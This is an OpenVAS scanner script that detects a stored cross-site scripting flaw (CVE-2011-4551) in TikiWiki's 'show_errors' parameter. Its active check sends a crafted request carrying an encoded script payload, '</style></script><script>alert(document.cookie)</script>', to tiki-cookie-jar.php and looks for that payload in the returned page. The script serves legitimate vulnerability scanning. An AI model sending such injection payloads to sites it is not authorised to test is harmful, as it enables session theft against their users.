###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tikiwiki_show_errors_stored_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# TikiWiki 'show_errors' Parameter Stored Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "TikiWiki versions prior to 8.2 and 6.5 LTS.";
tag_insight = "The flaw is due to improper validation of user-supplied input to
  'show_errors' paramter in 'tiki-cookie-jar.php', 'tiki-login.php' and
  'tiki-remind_password.php' script, which allows attackers to conduct stored
   xss by sending a crafted request with JavaScript.";
tag_solution = "Upgrade TikiWiki to 8.2 or 6.5 LTS or later,
  For updates refer to http://info.tiki.org/";
tag_summary = "The host is running TikiWiki and is prone to stored cross site
  scripting vulnerabilitiy.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902651";
CPE = "cpe:/a:tikiwiki:tikiwiki";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4551");
  script_bugtraq_id(51128);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-21 15:59:55 +0530 (Wed, 21 Dec 2011)");
  script_name("TikiWiki 'show_errors' Parameter Stored Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://info.tiki.org/tiki-view_articles.php?topic=1");
  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/51128.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108036/INFOSERVE-ADV2011-07.txt");

  script_description(desc);
  script_summary("Check if TikiWiki is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("TikiWiki/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get TikiWiki Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Construct the attack request
url1 = dir + "/tiki-cookie-jar.php?show_errors=y&xss=%3C/style%3E%3C/script" +
             "%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E";

req = string("GET ", url1, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept-Encoding: gzip,deflate\r\n",
             "Connection: keep-alive\r\n\r\n");

## Send the attack request
res = http_keepalive_send_recv(port:port, data:req);

##Construct the request to access index,php page
url2 = dir + "/tiki-index.php";
req = string("GET ", url2, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Cookie: runs_before_js_detect=2; javascript_enabled=y;" +
             " PHPSESSID=5181826cedb8dff2c347206640573492\r\n\r\n");

## Now access the tiki-index.php page to check the javascript
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
   "show_errors: 'y'" >< res &&
   "</style></script><script>alert(document.cookie)</script>" >< res)
{
  security_warning(port);
  exit(0);
}

